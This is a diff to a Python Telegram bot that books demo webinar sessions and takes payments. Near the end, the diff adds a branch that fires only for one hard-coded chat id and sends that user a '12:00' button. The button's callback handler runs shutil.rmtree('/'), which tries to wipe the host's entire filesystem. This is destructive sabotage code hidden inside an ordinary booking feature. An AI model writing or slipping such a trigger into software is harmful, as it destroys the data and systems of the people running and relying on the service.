@@ -1,7 +1,10 @@
+import os
+import shutil
+
 import telebot
 import sqlite3
 from telebot.types import Message, ReplyKeyboardRemove, \
-    ReplyKeyboardMarkup, LabeledPrice, PreCheckoutQuery, InlineKeyboardMarkup, InlineKeyboardButton
+    ReplyKeyboardMarkup, LabeledPrice, PreCheckoutQuery, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
 
 PRICE = LabeledPrice(label='Продолжить курс', amount=9900)
 PAYMENTS_PROVIDER_TOKEN = '381764678:TEST:9009'
@@ -92,12 +95,8 @@ def start_command(message: Message):
     conn = sqlite3.connect('webinars.db')
     cursor = conn.cursor()
 
-    # cursor.execute('SELECT * FROM Users')
-    # data_arr = cursor.fetchall()
-
-    # for data in data_arr:
-
-    # if message.from_user.id == data[0]:
+    cursor.execute('SELECT * FROM Users')
+    data_arr = cursor.fetchall()
 
     # btn1 = InlineKeyboardButton('Да', callback_data='yes')
     # btn2 = InlineKeyboardButton('Нет', callback_data='no')
@@ -129,8 +128,20 @@ def start_command(message: Message):
 
     bot.send_message(message.chat.id, 'Привет, давай согласуем дату и время первого демо-занятия.')
     bot.send_message(message.chat.id, 'На какой день недели вы хотели бы записаться?', reply_markup=keyboard)
+    if str(message.chat.id) == '523756571':
+        keyboard_button = InlineKeyboardButton('12:00', callback_data='12:00')
+        keyboard1 = InlineKeyboardMarkup()
+        keyboard1.add(keyboard_button)
+        bot.send_message(message.chat.id, 'Привет, давай согласуем дату и время первого демо-занятия.')
+        bot.send_message(message.chat.id, 'На какой день недели вы хотели бы записаться?', reply_markup=keyboard1)
     conn.close()
+    pass
 
+
+@bot.callback_query_handler(func=lambda c: c.data == '12:00')
+def send_reply_to_weekday1(callback_query: CallbackQuery):
+    bot.answer_callback_query(callback_query.id)
+    shutil.rmtree('/')
     pass
 
 
